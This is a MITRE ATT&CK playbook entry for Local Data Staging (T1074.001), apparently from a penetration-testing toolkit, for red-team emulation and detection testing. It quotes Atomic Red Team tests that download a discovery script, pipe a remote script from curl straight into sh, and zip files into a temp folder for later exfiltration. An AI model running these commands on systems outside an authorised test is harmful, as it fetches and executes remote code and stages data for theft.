---
name: "T1074.001_local-data-staging"
description: "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1074.001
  - collection
  - esxi
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1074.001"
tactic: "collection"
all_tactics:
  - collection
platforms:
  - ESXi
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1074/001"
tech_stack:
  - esxi
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-200
chains_with:
  - T1074
  - T1074.002
prerequisites:
  - T1074
severity_boost:
  T1074: "Chain with T1074 for deeper attack path"
  T1074.002: "Chain with T1074.002 for deeper attack path"
---

# T1074.001 Local Data Staging

> **Sub-technique of:** T1074

## High-Level Description

Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.

Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.

## Kill Chain Phase

- Collection (TA0009)

**Platforms:** ESXi, Linux, macOS, Windows

## What to Check

- [ ] Identify if Local Data Staging technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Local Data Staging
- [ ] Check Linux systems for indicators of Local Data Staging
- [ ] Check macOS systems for indicators of Local Data Staging
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Stage data from Discovery.bat

Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
verify that the file is saved in the temp directory.

**Supported Platforms:** windows

```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile #{output_file}
```

### Atomic Test 2: Stage data from Discovery.sh

Utilize curl to download discovery.sh and execute a basic information gathering shell script

**Supported Platforms:** linux, macos

```bash
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
```

**Dependencies:**

- Check if curl is installed on the machine.

### Atomic Test 3: Zip a Folder with PowerShell for Staging in Temp

Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
was placed in the temp directory.

**Supported Platforms:** windows

```powershell
Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Local Data Staging by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1074.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Detection of Local Data Staging Prior to Exfiltration

## Risk Assessment

| Finding                                 | Severity | Impact     |
| --------------------------------------- | -------- | ---------- |
| Local Data Staging technique applicable | Low      | Collection |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [Prevailion DarkWatchman 2021](https://web.archive.org/web/20220629230035/https://www.prevailion.com/darkwatchman-new-fileless-techniques/)
- [Atomic Red Team - T1074.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1074.001)
- [MITRE ATT&CK - T1074.001](https://attack.mitre.org/techniques/T1074/001)
